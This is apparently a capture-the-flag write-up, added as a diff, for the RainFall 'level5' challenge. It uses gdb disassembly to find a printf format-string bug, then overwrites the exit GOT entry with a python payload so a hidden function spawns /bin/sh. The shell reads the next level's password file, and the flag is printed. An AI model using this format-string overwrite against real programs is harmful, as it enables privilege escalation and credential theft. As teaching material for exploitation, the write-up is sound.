@@ -1,0 +1,88 @@
+# At the root of the repository we can found a binary called level5
+# By testing the binary, we can see that it's waiting for something on stdin and print it then exit
+
+level5@RainFall:~$ ./level5
+toto
+toto
+
+# By checking the main with gdb we can see that it's calling only a function 'n'
+
+(gdb) disas main
+Dump of assembler code for function main:
+   0x08048504 <+0>:	push   %ebp
+   0x08048505 <+1>:	mov    %esp,%ebp
+   0x08048507 <+3>:	and    $0xfffffff0,%esp
+   0x0804850a <+6>:	call   0x80484c2 <n>
+   0x0804850f <+11>:	leave  
+   0x08048510 <+12>:	ret    
+End of assembler dump.
+
+# By checking n we can see the fgets function that reads on stdin, the printf function that write what we gave to stdin
+# And the function exit only without return
+# printf will be our exploit
+
+# By checking more on functions in the binary, we can found a function 'o' which is defined without being called
+
+(gdb) info functions
+All defined functions:
+
+...
+0x080483f0  _start
+0x08048420  __do_global_dtors_aux
+0x08048480  frame_dummy
+0x080484a4  o
+0x080484c2  n
+0x08048504  main
+0x08048520  __libc_csu_init
+
+# Let's disaseamble it
+
+(gdb) disas o
+Dump of assembler code for function o:
+   0x080484a4 <+0>:	push   %ebp
+   0x080484a5 <+1>:	mov    %esp,%ebp
+   0x080484a7 <+3>:	sub    $0x18,%esp
+   0x080484aa <+6>:	movl   $0x80485f0,(%esp)
+   0x080484b1 <+13>:	call   0x80483b0 <system@plt>
+   0x080484b6 <+18>:	movl   $0x1,(%esp)
+   0x080484bd <+25>:	call   0x8048390 <_exit@plt>
+End of assembler dump.
+
+# We can see a call to system and it's calling /bin/sh, we know that thanks to the address where it's written '0x80485f0'
+
+(gdb) x/s 0x80485f0
+0x80485f0:	 "/bin/sh"
+
+# We can conclude that the function 'o' it's what we have to call
+# Let's suppose instead of calling exit in function n we can call the function 'o', is it possible?
+# Thanks to printf we can write on addresses on the memory, let's find the address of exit called in n
+
+level5@RainFall:~$ objdump -R ./level5 | grep exit
+08049828 R_386_JUMP_SLOT   _exit
+08049838 R_386_JUMP_SLOT   exit
+
+# We are interested in the second exit with the address of 08049838
+# Let's see where the function return as some levels before
+
+level5@RainFall:~$ ./level5
+AAAA %x %x %x %x %x %x %x
+AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825 78252078
+
+# The next instruction is executed on the 4th parameter
+# We'll try to write the address of o with the address of exit
+# To do that we'll take the decimal address of 'o' and use the '$n' modifier of printf
+# The address in decimal of 'o' (0x080484a4) is: 134513828 (thanks google (hexa to decimal))
+# We'll have to write 134513828 bytes - 4 (the 4 bytes of the address of exit written before) to write the good address in the memory
+
+(python -c 'print("\x38\x98\x04\x08" + "%134513824u%4$n")'; cat -) | ~/level5
+    ...
+
+
+
+    ... 512
+whoami
+level6
+cat /home/user/level6/.pass
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+
+# That's our flag: d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
